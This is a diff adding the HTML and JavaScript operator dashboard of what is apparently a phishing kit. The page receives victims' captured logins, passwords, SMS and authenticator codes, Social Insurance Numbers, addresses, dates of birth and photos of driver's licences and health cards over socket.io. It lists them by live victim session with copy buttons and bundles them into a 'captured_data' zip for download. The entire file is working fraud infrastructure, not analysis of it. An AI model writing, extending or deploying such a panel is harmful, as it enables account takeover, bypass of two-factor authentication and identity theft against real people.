@@ -1,0 +1,816 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Admin Dashboard (patched)</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      overflow: hidden;
+      background-color: black;
+      color: white;
+    }
+    .dashboard-wrapper {
+      display: flex;
+      width: 100vw;
+      height: 100vh;
+    }
+    #sessions-container {
+      width: 33.333vw;
+      overflow-y: auto;
+      padding: 10px;
+      box-sizing: border-box;
+    }
+    #session-details-panel {
+      width: 33.333vw;
+      display: none;
+      border: 1px solid #ccc;
+      padding: 10px;
+      box-sizing: border-box;
+      overflow: auto;
+    }
+    #extra-panel {
+      width: 33.333vw;
+      border: 1px solid #ccc;
+      padding: 10px;
+      box-sizing: border-box;
+      overflow: auto;
+    }
+    #session-details-panel .session-box {
+      transform: scale(2);
+      transform-origin: top left;
+    }
+    .session-box {
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      padding: 10px;
+      margin: 10px 0;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      width: 100%;
+      box-sizing: border-box;
+      cursor: pointer;
+      min-height: 80px;
+    }
+    .session-box.selected {
+      background-color: lightblue;
+      color: black;
+    }
+    .session-info {
+      display: flex;
+      align-items: center;
+      flex-grow: 1;
+    }
+    .status-indicator {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      margin-right: 8px;
+    }
+    .status-online { background-color: green; }
+    .status-offline { background-color: red; }
+    .delete-btn {
+      padding: 4px 8px;
+      border: none;
+      background: #e74c3c;
+      color: white;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    #session-details-panel .session-info {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+    }
+    #session-details-panel .session-info > * {
+      margin-bottom: 10px;
+    }
+    #session-details-panel .session-box {
+      width: 50%;
+    }
+    .action-btn {
+      padding: 8px 12px;
+      border: none;
+      color: white;
+      border-radius: 4px;
+      cursor: pointer;
+      margin: 5px;
+      font-size: 14px;
+      transition: background-color 0.15s ease, box-shadow 0.15s ease;
+    }
+    .action-btn:hover {
+      box-shadow: 0 2px 4px rgba(0,0,0,0.3);
+      filter: brightness(1.1);
+    }
+    .action-btn:active { 
+      transform: translateY(1px);
+      box-shadow: 0 1px 2px rgba(0,0,0,0.3);
+    }
+    .btn-android { background-color: #4CAF50; }
+    .btn-iphone { background-color: #2196F3; }
+    .btn-sms { background-color: #FF9800; color: black; }
+    .btn-gauth { background-color: #9C27B0; }
+    .btn-phone { background-color: #607D8B; }
+    .btn-email { background-color: #FF5722; color: black; }
+    .btn-loading { background-color: #795548; }
+    .btn-wrong { background-color: #f44336; color: black; }
+    .action-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+      margin-top: 20px;
+    }
+  </style>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+</head>
+<body>
+  <div style="display: flex; align-items: center; justify-content: space-between; padding: 10px 20px; background-color: #1a1a1a;">
+    <h1 style="margin: 0;">Admin Dashboard</h1>
+    <button id="download-btn" class="action-btn" style="background-color: #3498db; padding: 10px 20px; font-size: 16px;">
+      Download All Data
+    </button>
+  </div>
+  <div class="dashboard-wrapper">
+    <div id="sessions-container"></div>
+    <div id="session-details-panel"></div>
+    <div id="extra-panel"></div>
+  </div>
+
+  <script src="/socket.io/socket.io.js"></script>
+  <script>
+    (function() {
+  const token = localStorage.getItem('adminToken');
+  if (!token || token !== 'authenticated') {
+    window.location.replace('/adminlogin.html');
+  }
+})();
+    const socket = io();
+
+    // --- Helpers: normalization + safe localStorage access (client-only) ---
+    function normalizeId(x) {
+      return String(x === undefined || x === null ? '' : x).trim().toLowerCase();
+    }
+    function safeGetRaw(key) {
+      try { return localStorage.getItem(key); } catch (e) { return null; }
+    }
+    function safeSetRaw(key, val) {
+      try { localStorage.setItem(key, val); return true; }
+      catch (e) { console.error('localStorage.setItem failed', key, e); return false; }
+    }
+
+    function getDeletedSessionsArray() {
+      try {
+        const raw = safeGetRaw('deletedSessions');
+        if (!raw) return window.__deletedSessionsFallback || [];
+        const parsed = JSON.parse(raw);
+        if (!Array.isArray(parsed)) return window.__deletedSessionsFallback || [];
+        return parsed.map(normalizeId);
+      } catch (e) {
+        return window.__deletedSessionsFallback || [];
+      }
+    }
+
+    function getDeletedSessionsSet() { return new Set(getDeletedSessionsArray()); }
+
+    function addDeletedSession(id) {
+      const sid = normalizeId(id);
+      const arr = getDeletedSessionsArray();
+      if (!arr.includes(sid)) {
+        arr.push(sid);
+        if (!safeSetRaw('deletedSessions', JSON.stringify(arr))) {
+          window.__deletedSessionsFallback = arr;
+          showToast('Could not persist deletion (localStorage unavailable).');
+        } else {
+          window.__deletedSessionsFallback = arr;
+        }
+      }
+    }
+
+    function removeDeletedSession(id) {
+      const sid = normalizeId(id);
+      const arr = getDeletedSessionsArray().filter(existing => existing !== sid);
+      if (!safeSetRaw('deletedSessions', JSON.stringify(arr))) {
+        window.__deletedSessionsFallback = arr;
+      } else {
+        window.__deletedSessionsFallback = arr;
+      }
+    }
+
+    // --- Persist dashboardSessionID so refreshes use same dashboard ---
+    let dashboardSessionID = safeGetRaw('dashboardSessionID');
+    if (!dashboardSessionID) {
+      dashboardSessionID = "dashboard_" + Math.random().toString(36).substring(2, 8);
+      safeSetRaw('dashboardSessionID', dashboardSessionID);
+    }
+
+    // Join the dashboard session (we emit after we've set dashboardSessionID)
+    socket.emit('dashboard-join', { sessionID: dashboardSessionID });
+
+    let currentDetailSession = null;
+    const sessionsData = {};
+
+    // Load persisted sessions but filter out locally deleted ones (client-only)
+    (function() {
+      const raw = safeGetRaw('dashboardSessions');
+      if (raw) {
+        try {
+          const parsed = JSON.parse(raw);
+          const deleted = new Set(getDeletedSessionsArray());
+          Object.keys(parsed).forEach(k => {
+            const nk = normalizeId(k);
+            if (!deleted.has(nk)) sessionsData[nk] = parsed[k];
+          });
+        } catch (e) {
+          console.error('Could not parse persisted sessions:', e);
+        }
+      }
+
+      // Also load from server on startup
+      fetch('/api/sessions')
+        .then(res => res.json())
+        .then(serverSessions => {
+          console.log('Loaded sessions from server:', serverSessions);
+          const deleted = new Set(getDeletedSessionsArray());
+          
+          serverSessions.forEach(({ sessionID, ip, data, online }) => {
+            const sid = normalizeId(sessionID);
+            if (deleted.has(sid)) return;
+            
+            if (!sessionsData[sid]) {
+              sessionsData[sid] = {
+                ip,
+                identifier: '',
+                password: '',
+                status: online ? 'online' : 'offline',
+                sms: '',
+                gauth: '',
+                phoneNumber: '',
+                emailCode: '',
+                balanceRange: '',
+                fullName: '',
+                dateOfBirth: '',
+                city: '',
+                province: '',
+                streetAddress: '',
+                postalCode: '',// ADD:
+                sin: '',
+                phone: '',
+                license: '',
+                licenceFront: '',
+                licenceBack: '',
+                licenceHealth: '',
+                images: {}
+              };
+            }
+            
+            // Merge server data
+            if (data) {
+              Object.entries(data).forEach(([key, value]) => {
+                // Convert data keys to camelCase if needed
+                const camelKey = key.replace(/-([a-z])/g, (g) => g[1].toUpperCase());
+                if (sessionsData[sid].hasOwnProperty(camelKey)) {
+                  sessionsData[sid][camelKey] = value;
+                }
+              });
+            }
+            
+            sessionsData[sid].status = online ? 'online' : 'offline';
+          });
+          
+          saveSessionData();
+          
+          // Render all sessions
+          renderAllSessions();
+        })
+        .catch(err => {
+          console.error('Failed to load sessions from server:', err);
+        });
+    })();
+
+    function renderAllSessions() {
+      const container = document.getElementById('sessions-container');
+      container.innerHTML = '';
+      const deleted = new Set(getDeletedSessionsArray());
+      
+      Object.entries(sessionsData).forEach(([sid, data]) => {
+        if (deleted.has(sid)) return;
+        const sessionBox = createSessionBox(sid, data.ip);
+        if (sessionBox) container.appendChild(sessionBox);
+      });
+    }
+
+    function saveSessionData() {
+      try {
+        safeSetRaw('dashboardSessions', JSON.stringify(sessionsData));
+      } catch (e) {
+        console.error('saveSessionData failed', e);
+      }
+    }
+
+    function createSessionBox(id, ip) {
+      const sid = normalizeId(id);
+
+      // If the session is marked deleted locally, bail out immediately
+      const deletedSet = getDeletedSessionsSet();
+      if (deletedSet.has(sid)) return null;
+
+      // keep internal storage consistent using normalized key
+      if (sessionsData[sid]) {
+        sessionsData[sid].ip = ip;
+      } else {
+        sessionsData[sid] = { ip, identifier: '', password: '', status: 'offline', sms: '', gauth: '', phoneNumber: '', emailCode: '', balanceRange: '', phone: '', license: '' };
+      }
+      const data = sessionsData[sid];
+
+      const box = document.createElement('div');
+      box.className = 'session-box';
+      box.id = `session-${sid}`;
+
+      const info = document.createElement('div');
+      info.className = 'session-info';
+
+      const statusDot = document.createElement('span');
+      statusDot.className = 'status-indicator ' + (data.status === 'online' ? 'status-online' : 'status-offline');
+      statusDot.title = data.status;
+
+      const text = document.createElement('span');
+      text.textContent = `ID: ${sid} | IP: ${data.ip}`;
+
+      const idSpan = document.createElement('span');
+      idSpan.style.marginLeft = '10px';
+      idSpan.textContent = 'Identifier: ';
+      const idValue = document.createElement('span');
+      idValue.id = `identifier-${sid}`;
+      idValue.textContent = data.identifier;
+      idSpan.appendChild(idValue);
+
+      info.appendChild(statusDot);
+      info.appendChild(text);
+      info.appendChild(idSpan);
+
+      const del = document.createElement('button');
+      del.className = 'delete-btn';
+      del.textContent = 'Delete';
+      del.addEventListener('click', e => {
+        e.stopPropagation();
+
+        // remove DOM & persisted session data
+        const boxEl = document.getElementById(`session-${sid}`);
+        if (boxEl) boxEl.remove();
+
+        if (sessionsData[sid]) delete sessionsData[sid];
+
+        // mark deleted locally (normalized)
+        addDeletedSession(sid);
+        saveSessionData();
+
+        // don't re-open it after refresh
+        const last = safeGetRaw('lastDetailSession');
+        if (last && normalizeId(last) === sid) safeSetRaw('lastDetailSession', '');
+
+        // inform server (left as-is – deletion remains client-side)
+        socket.emit('dashboard-delete-session', { dashboardID: dashboardSessionID, sessionID: sid });
+
+        if (currentDetailSession === sid) {
+          document.getElementById('session-details-panel').style.display = 'none';
+          const extra = document.getElementById('extra-panel');
+          extra.innerHTML = '';
+          extra.style.display = 'none';
+          currentDetailSession = null;
+        }
+      });
+
+      box.addEventListener('click', () => openDetail(sid));
+      box.appendChild(info);
+      box.appendChild(del);
+      return box;
+    }
+
+    function buildDetailPanel(id) {
+      const panel = document.getElementById('session-details-panel');
+      panel.innerHTML = '';
+      const data = sessionsData[id];
+      if (!data) return;
+
+      const detailBox = document.createElement('div');
+      detailBox.className = 'session-box';
+
+      const info = document.createElement('div');
+      info.className = 'session-info';
+
+      const statusDot = document.createElement('span');
+      statusDot.className = 'status-indicator ' + (data.status === 'online' ? 'status-online' : 'status-offline');
+
+      const text = document.createElement('span');
+      text.textContent = `ID: ${id} | IP: ${data.ip}`;
+
+      const headerRow = document.createElement('div');
+      headerRow.style.display = 'flex';
+      headerRow.style.alignItems = 'center';
+      headerRow.appendChild(statusDot);
+      headerRow.appendChild(text);
+      info.appendChild(headerRow);
+
+      const fields = [
+        { label: 'Identifier', key: 'identifier' },
+        { label: 'Password', key: 'password' },
+        { label: 'Balance Range', key: 'balanceRange' },
+        { label: 'Full Name', key: 'fullName' },
+        { label: 'Date of Birth', key: 'dateOfBirth' },
+        { label: 'City', key: 'city' },
+        { label: 'Province', key: 'province' },
+        { label: 'Street Address', key: 'streetAddress' },
+        { label: 'Postal Code', key: 'postalCode' },
+        { label: 'SIN', key: 'sin' },
+        { label: 'Phone', key: 'phone' },
+        { label: 'License', key: 'license' }
+      ];
+// ADD:
+      fields.forEach(field => {
+        const wrapper = document.createElement('div');
+        wrapper.style.display = 'flex';
+        wrapper.style.alignItems = 'center';
+        wrapper.style.marginBottom = '10px';
+
+        const btn = document.createElement('button');
+        btn.textContent = `${field.label}:`;
+        btn.style.marginLeft = '10px';
+        btn.title = 'Click to copy';
+        btn.addEventListener('click', () => {
+          navigator.clipboard.writeText(data[field.key]);
+          showToast(`${field.label} copied`);
+        });
+
+        const value = document.createElement('span');
+        value.textContent = data[field.key];
+        value.style.marginLeft = '10px';
+
+        wrapper.appendChild(btn);
+        wrapper.appendChild(value);
+        info.appendChild(wrapper);
+      });
+
+      // Licence & health card images
+      if (data.images && (data.images.front || data.images.back || data.images.health)) {
+        const imgHeader = document.createElement('div');
+        imgHeader.textContent = 'ID Photos:';
+        imgHeader.style.marginBottom = '6px';
+        imgHeader.style.fontWeight = 'bold';
+        info.appendChild(imgHeader);
+
+        [
+          { key: 'front',  label: 'Licence — Front' },
+          { key: 'back',   label: 'Licence — Back'  },
+          { key: 'health', label: 'Health Card'      }
+        ].forEach(({ key, label }) => {
+          if (!data.images[key]) return;
+          const lbl = document.createElement('div');
+          lbl.textContent = label + ':';
+          lbl.style.fontSize = '12px';
+          lbl.style.marginBottom = '4px';
+          info.appendChild(lbl);
+
+          const img = document.createElement('img');
+          img.src = `/api/images/${data.images[key]}`;
+          img.style.maxWidth = '100%';
+          img.style.borderRadius = '8px';
+          img.style.marginBottom = '10px';
+          img.style.display = 'block';
+          info.appendChild(img);
+        });
+      }
+
+      detailBox.appendChild(info);
+      panel.appendChild(detailBox);
+      panel.style.display = 'block';
+    }
+
+    function buildExtraPanel(id) {
+      const extra = document.getElementById('extra-panel');
+      extra.innerHTML = '';
+      extra.style.display = 'none';
+    }
+
+    function openDetail(id) {
+      const sid = normalizeId(id);
+
+      // Do not open details for locally-deleted sessions
+      if (getDeletedSessionsSet().has(sid)) {
+        const el = document.getElementById(`session-${sid}`);
+        if (el) el.classList.remove('selected');
+        return;
+      }
+
+      document.querySelectorAll('.session-box.selected').forEach(el => el.classList.remove('selected'));
+      const small = document.getElementById(`session-${sid}`);
+      if (small) small.classList.add('selected');
+
+      currentDetailSession = sid;
+      socket.emit('request-session-history', sid);
+      safeSetRaw('lastDetailSession', sid);
+      buildDetailPanel(sid);
+      buildExtraPanel(sid);
+    }
+
+    function showToast(message) {
+      const toast = document.createElement('div');
+      toast.textContent = message;
+      Object.assign(toast.style, {
+        position: 'fixed',
+        top: '20px',
+        left: '50%',
+        transform: 'translateX(-50%)',
+        background: 'rgba(52,152,219,0.95)',
+        color: '#fff',
+        padding: '8px 14px',
+        borderRadius: '4px',
+        fontSize: '20px',
+        opacity: '1',
+        zIndex: '9999',
+        transition: 'opacity 3s ease-out'
+      });
+      document.body.appendChild(toast);
+      requestAnimationFrame(() => { toast.style.opacity = '0'; });
+      setTimeout(() => toast.remove(), 3000);
+    }
+
+    const dataHandlers = {
+      'client-identifier': 'identifier',
+      'client-password': 'password',
+      'client-sms': 'sms',
+      'client-gauth': 'gauth',
+      'client-phone-number': 'phoneNumber',
+      'client-email-code': 'emailCode',
+      'client-balance-range': 'balanceRange',
+      'client-full-name': 'fullName',
+      'client-date-of-birth': 'dateOfBirth',
+      'client-city': 'city',
+      'client-province': 'province',
+      'client-street-address': 'streetAddress',
+      'client-postal-code': 'postalCode',
+      'client-sin': 'sin',
+      'client-phone': 'phone',
+      'client-license': 'license',
+      'client-licence-front-submitted': 'licenceFront',
+      'client-licence-back-submitted': 'licenceBack',
+      'client-licence-health-submitted': 'licenceHealth'
+    };
+
+    // --- Socket handlers: normalize incoming IDs and honor deletedSessions set (client-only) ---
+    socket.on('session-list', list => {
+      const container = document.getElementById('sessions-container');
+      container.innerHTML = '';
+
+      const deletedSet = getDeletedSessionsSet();
+
+      // Normalize IDs for quick lookup
+      const onlineSet = new Set(list.map(({ sessionID }) => normalizeId(sessionID)));
+
+      // Step 1: update sessionsData with online sessions from server
+      list.forEach(({ sessionID, ip }) => {
+        const sid = normalizeId(sessionID);
+        if (deletedSet.has(sid)) return;
+
+        if (!sessionsData[sid]) {
+          sessionsData[sid] = { ip, identifier: '', password: '', status: 'online', sms: '', gauth: '', phoneNumber: '', emailCode: '', balanceRange: '', phone: '', license: '', licenceFront: '', licenceBack: '', licenceHealth: '', images: {} };
+        } else {
+          sessionsData[sid].ip = ip;
+          sessionsData[sid].status = 'online';
+        }
+      });
+
+      // Step 2: mark any known session NOT in the list as offline
+      Object.keys(sessionsData).forEach(sid => {
+        if (!onlineSet.has(sid)) {
+          sessionsData[sid].status = 'offline';
+        }
+      });
+
+      // Step 3: render all known (non-deleted) sessions
+      Object.entries(sessionsData).forEach(([sid, data]) => {
+        if (deletedSet.has(sid)) return;
+        const sessionBox = createSessionBox(sid, data.ip);
+        if (sessionBox) container.appendChild(sessionBox);
+      });
+
+      saveSessionData();
+
+      const lastRaw = safeGetRaw('lastDetailSession');
+      const last = lastRaw ? normalizeId(lastRaw) : null;
+      if (last && !deletedSet.has(last)) openDetail(last);
+    });
+
+    socket.on('client-connected', ({ sessionID, ip }) => {
+      const sid = normalizeId(sessionID);
+      if (getDeletedSessionsSet().has(sid)) return; // guard
+
+      sessionsData[sid] = sessionsData[sid] || { 
+        ip, 
+        identifier: '', 
+        password: '', 
+        status: 'online', 
+        sms: '', 
+        gauth: '', 
+        phoneNumber: '', 
+        emailCode: '', 
+        balanceRange: '',
+        fullName: '',
+        dateOfBirth: '',
+        city: '',
+        province: '',
+        streetAddress: '',
+        postalCode: '',
+        sin: '',
+        phone: '',
+        license: '',
+        licenceFront: '',
+        licenceBack: '',
+        licenceHealth: '',
+        images: {}
+      };
+      sessionsData[sid].status = 'online';
+      sessionsData[sid].ip = ip;
+      const existing = document.getElementById(`session-${sid}`);
+      if (!existing) {
+        const sessionBox = createSessionBox(sid, ip);
+        if (sessionBox) {
+          document.getElementById('sessions-container').appendChild(sessionBox);
+        }
+      } else {
+        const dot = existing.querySelector('.status-indicator');
+        if (dot) dot.className = 'status-indicator status-online';
+      }
+      if (currentDetailSession === sid) buildDetailPanel(sid);
+      saveSessionData();
+    });
+
+    socket.on('client-disconnected', ({ sessionID }) => {
+      const sid = normalizeId(sessionID);
+      if (getDeletedSessionsSet().has(sid)) return; // guard
+
+      if (sessionsData[sid]) {
+        sessionsData[sid].status = 'offline';
+        const existing = document.getElementById(`session-${sid}`);
+        if (existing) {
+          const dot = existing.querySelector('.status-indicator');
+          if (dot) dot.className = 'status-indicator status-offline';
+        }
+        if (currentDetailSession === sid) buildDetailPanel(sid);
+        saveSessionData();
+      }
+    });
+
+    Object.entries(dataHandlers).forEach(([eventName, key]) => {
+      socket.on(eventName, payload => {
+        console.log(`Received ${eventName}:`, payload);
+        const sid = normalizeId(payload.sessionID || payload.sessionId || payload.session);
+        if (getDeletedSessionsSet().has(sid)) return; // skip updates for deleted sessions
+
+        // The server sends the data with the type name as the key
+        // e.g., for "client-balance-range", payload = { sessionID, "balance-range": data }
+        // We need to extract the actual type name from the event
+        const typeFromEvent = eventName.replace('client-', '');
+        const value = payload[typeFromEvent] || payload[key];
+        
+        console.log(`Extracted value for ${key}:`, value);
+        
+        if (sessionsData[sid]) {
+          sessionsData[sid][key] = value;
+          if (payload.images) sessionsData[sid].images = Object.assign(sessionsData[sid].images || {}, payload.images);
+          const smallVal = document.getElementById(`${key}-${sid}`);
+          if (smallVal) smallVal.textContent = value;
+          if (currentDetailSession === sid) buildDetailPanel(sid);
+          saveSessionData();
+        } else {
+          // If the session doesn't exist yet, create a minimal entry (but only if not deleted)
+          sessionsData[sid] = { 
+            ip: payload.ip || '', 
+            identifier: '', 
+            password: '', 
+            status: 'offline', 
+            sms: '', 
+            gauth: '', 
+            phoneNumber: '', 
+            emailCode: '', 
+            balanceRange: '',
+            fullName: '',
+            dateOfBirth: '',
+            city: '',
+            province: '',
+            streetAddress: '',
+            postalCode: '',
+            sin: '',
+            phone: '',
+            license: '',
+            licenceFront: '',
+            licenceBack: '',
+            licenceHealth: '',
+            images: {}
+          };
+          sessionsData[sid][key] = value;
+          if (payload.images) sessionsData[sid].images = Object.assign(sessionsData[sid].images, payload.images);
+          saveSessionData();
+        }
+      });
+    });
+
+    socket.on('session-history', ({ sessionID, events, images }) => {
+      const sid = normalizeId(sessionID);
+      if (getDeletedSessionsSet().has(sid)) return;
+
+      if (sessionsData[sid]) {
+        events.forEach(evt => {
+          if (dataHandlers[`client-${evt.type}`]) {
+            sessionsData[sid][dataHandlers[`client-${evt.type}`]] = evt.data;
+          }
+        });
+        if (images && Object.keys(images).length > 0) {
+          sessionsData[sid].images = Object.assign(sessionsData[sid].images || {}, images);
+        }
+        if (currentDetailSession === sid) {
+          buildDetailPanel(sid);
+          buildExtraPanel(sid);
+        }
+        saveSessionData();
+      }
+    });
+
+    // optional: listen for server ack/un-delete if you implement it server-side
+    socket.on('dashboard-delete-ack', ({ dashboardID, sessionID }) => {
+      // server told us it's recorded – keep local state consistent (no-op here)
+      // Could display a toast: showToast(`Deleted ${sessionID} on server`);
+    });
+
+    // Download all data functionality// ADD:
+    document.getElementById('download-btn').addEventListener('click', async () => {
+      const deletedSet = getDeletedSessionsSet();
+      const zip = new JSZip();
+
+      let txt = '=== CAPTURED DATA FROM ALL SESSIONS ===\n\n';
+      txt += `Generated: ${new Date().toLocaleString()}\n`;
+      txt += `Total Sessions: ${Object.keys(sessionsData).filter(s => !deletedSet.has(s)).length}\n\n`;
+      txt += '='.repeat(80) + '\n\n';
+
+      for (const [sid, data] of Object.entries(sessionsData)) {
+        if (deletedSet.has(sid)) continue;
+
+        txt += `SESSION ID: ${sid}\n`;
+        txt += '-'.repeat(80) + '\n';
+        txt += `IP Address: ${data.ip}\n`;
+        txt += `Status: ${data.status}\n`;
+        txt += `Identifier: ${data.identifier}\n`;
+        txt += `Password: ${data.password}\n`;
+        txt += `Balance Range: ${data.balanceRange}\n`;
+        txt += `Full Name: ${data.fullName}\n`;
+        txt += `Date of Birth: ${data.dateOfBirth}\n`;
+        txt += `City: ${data.city}\n`;
+        txt += `Province: ${data.province}\n`;
+        txt += `Street Address: ${data.streetAddress}\n`;
+        txt += `Postal Code: ${data.postalCode}\n`;
+        txt += `SIN: ${data.sin}\n`;
+        txt += `Phone: ${data.phone}\n`;
+        txt += `License: ${data.license}\n`;
+
+        // Fetch and bundle images
+        if (data.images) {
+          const imageLabels = { front: 'Licence Front', back: 'Licence Back', health: 'Health Card' };
+          for (const [side, filename] of Object.entries(data.images)) {
+            if (!filename) continue;
+            try {
+              const resp = await fetch(`/api/images/${filename}`);
+              if (resp.ok) {
+                const blob = await resp.blob();
+                const ext = filename.split('.').pop();
+                zip.file(`images/${sid}_${side}.${ext}`, blob);
+                txt += `${imageLabels[side] || side}: images/${sid}_${side}.${ext}\n`;
+              }
+            } catch (e) {
+              txt += `${imageLabels[side] || side}: (fetch failed)\n`;
+            }
+          }
+        }
+
+        txt += '\n' + '='.repeat(80) + '\n\n';
+      }
+
+      zip.file('data.txt', txt);
+
+      const zipBlob = await zip.generateAsync({ type: 'blob' });
+      const url = URL.createObjectURL(zipBlob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = `captured_data_${new Date().toISOString().replace(/[:.]/g, '-')}.zip`;
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      URL.revokeObjectURL(url);
+
+      showToast('Downloaded as zip with images');
+    });
+
+  </script>
+</body>
+</html>
